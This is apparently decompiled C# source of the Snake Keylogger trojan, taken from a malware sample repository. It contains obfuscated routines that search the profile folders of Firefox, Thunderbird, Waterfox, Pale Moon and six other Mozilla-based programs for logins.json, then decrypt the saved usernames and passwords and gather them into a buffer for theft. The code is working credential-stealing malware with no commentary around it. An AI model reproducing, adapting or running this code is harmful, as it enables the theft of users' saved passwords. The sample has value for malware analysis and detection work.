// Decompiled with JetBrains decompiler
// Type: ɮҭ�ƚߡ.ŁWˤ��
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-1f53f14c48ecd545980d315ae494ea6a2bd99fa1e9a3671debdf80626942bd2c.exe

using ˤׁ\u002D\u0097\u07BB;
using \uFFFDУWݝ\u26CA;
using ɮҭ\uFFFDƚߡ;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Web.Script.Serialization;

namespace ɮҭ\uFFFDƚߡ
{
  public class ŁWˤ\uFFFD\uFFFD
  {
    public static void RŁۨ뫆ҭ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
        if (directories.Length != 0)
          ;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (!flag)
          return;
        ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path1))
          ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
        ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
        int index2 = 0;
        while (index2 < logins.Length)
        {
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
          string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
          string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
          string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Firefox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
          \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
          checked { ++index2; }
        }
        뫆ׁş\uFFFDO.ߡٵζŲջ();
        try
        {
          foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
            뫆ׁş\uFFFDO.іϒˤԌݶ(num);
        }
        finally
        {
          List<IntPtr>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ٵЅ\uFFFDşҚ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Waterfox\\Profiles"));
        if (directories.Length != 0)
          ;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (!flag)
          return;
        ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path1))
          ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
        ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
        int index2 = 0;
        while (index2 < logins.Length)
        {
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
          string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
          string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
          string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: WaterFox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
          \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
          checked { ++index2; }
        }
        뫆ׁş\uFFFDO.ߡٵζŲջ();
        try
        {
          foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
            뫆ׁş\uFFFDO.іϒˤԌݶ(num);
        }
        finally
        {
          List<IntPtr>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ƚ\uFFFD\uFFFD\u07FBۣ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird\\Profiles\\"));
        if (directories.Length != 0)
          ;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (!flag)
          return;
        ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
        using (StreamReader streamReader = new StreamReader(path1))
          ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
        ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
        int index2 = 0;
        while (index2 < logins.Length)
        {
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
          string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
          string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
          string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Thunderbird\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
          \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
          checked { ++index2; }
        }
        뫆ׁş\uFFFDO.ߡٵζŲջ();
        try
        {
          foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
            뫆ׁş\uFFFDO.іϒˤԌݶ(num);
        }
        finally
        {
          List<IntPtr>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05C9ľִأA()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\SeaMonkey\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: SeaMonkey\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void מ꼺\uFFFDՄŎ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Comodo\\IceDragon\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Ice Dragon\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 꼺ş߂ų\u0385()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "8pecxstudios\\Cyberfox\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: CyberFox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFD\uFFFD\u002DZױ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FlashPeak\\SlimBrowser\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Slim\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDݶ늻і\uFFFD()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\icecat\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: IceCat\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u032EΑɛĂœ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PostboxApp\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: PostBox\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u05C3ε콪\u060Cܪ()
    {
      try
      {
        string path1 = (string) null;
        bool flag = false;
        string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions\\Pale Moon\\Profiles"));
        if (directories.Length == 0)
          return;
        string[] strArray = directories;
        int index1 = 0;
        while (index1 < strArray.Length)
        {
          string path2 = strArray[index1];
          string[] files = Directory.GetFiles(path2, "logins.json");
          if (files.Length > 0)
          {
            path1 = files[0];
            flag = true;
          }
          if (flag)
          {
            뫆ׁş\uFFFDO.\u07B4ҟ\uFFFD\u26CA䇹(path2);
            break;
          }
          checked { ++index1; }
        }
        if (flag)
        {
          ŁWˤ\uFFFD\uFFFD.FFLogins ffLogins;
          using (StreamReader streamReader = new StreamReader(path1))
            ffLogins = new JavaScriptSerializer().Deserialize<ŁWˤ\uFFFD\uFFFD.FFLogins>(streamReader.ReadToEnd());
          ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins = ffLogins.logins;
          int index2 = 0;
          while (index2 < logins.Length)
          {
            ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta aaalogshsindgdaLogndta = logins[index2];
            string str1 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedUsername);
            string str2 = 뫆ׁş\uFFFDO.R콪\uFFFDƌ丐(aaalogshsindgdaLogndta.encryptedPassword);
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: PaleMoon\r\nHost: " + aaalogshsindgdaLogndta.hostname + "\r\nUSR: " + str1 + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDٗ\u05C3\uFFFDc.\u0089\uFFFD\uFFFD\u0040\u07B4 += str3;
            checked { ++index2; }
          }
          뫆ׁş\uFFFDO.ߡٵζŲջ();
          try
          {
            foreach (IntPtr num in 뫆ׁş\uFFFDO.\u065AÒꓞZٕ)
              뫆ׁş\uFFFDO.іϒˤԌݶ(num);
          }
          finally
          {
            List<IntPtr>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private class FFLogins
    {
      public long nextId { get; set; }

      public ŁWˤ\uFFFD\uFFFD.aaalogshsindgdaLogndta[] logins { get; set; }

      public string[] disabledHosts { get; set; }

      public int version { get; set; }
    }

    private class aaalogshsindgdaLogndta
    {
      public long id { get; set; }

      public string hostname { get; set; }

      public string url { get; set; }

      public string httprealm { get; set; }

      public string formSubmitURL { get; set; }

      public string usernameField { get; set; }

      public string passwordField { get; set; }

      public string encryptedUsername { get; set; }

      public string encryptedPassword { get; set; }

      public string guid { get; set; }

      public int encType { get; set; }

      public long timeCreated { get; set; }

      public long timeLastUsed { get; set; }

      public long timePasswordChanged { get; set; }

      public long timesUsed { get; set; }
    }
  }
}
